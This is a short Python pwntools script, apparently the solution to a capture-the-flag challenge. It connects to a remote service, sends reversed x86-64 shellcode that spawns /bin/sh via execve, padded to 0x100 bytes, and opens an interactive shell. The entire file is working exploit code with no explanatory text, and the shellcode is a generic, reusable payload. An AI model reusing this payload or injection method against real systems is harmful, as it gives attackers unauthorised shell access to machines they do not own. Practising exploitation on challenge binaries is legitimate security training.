import argparse

from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))
# r = process(['./challenge'])
# gdb.attach(r, f'''
# ''')


sc = b'\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

r.sendlineafter(b'TI GNISREVER', (sc[::-1] + b'Yes, I have tried .ti gnisrever').rjust(0x100, b'\x00'));

r.interactive()